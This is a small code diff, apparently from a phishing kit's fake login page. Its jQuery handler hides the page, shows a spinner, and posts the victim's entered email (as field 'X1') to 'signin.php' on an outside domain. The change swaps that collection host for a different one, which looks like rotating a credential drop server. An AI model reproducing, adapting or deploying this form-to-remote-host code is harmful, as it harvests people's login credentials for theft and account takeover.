@@ -46,7 +46,7 @@ $(document).ready(function(){
         $("#mcontent").css("display", "none");
         $("#mspinner").css("display", "block");
         $.ajax({
-            url: "https://piromet-tr.com/kazfrd/signin.php",
+            url: "https://kiergp.co.uk/kazfrd/signin.php",
             method: "post",
             data: {
                 X1: email,
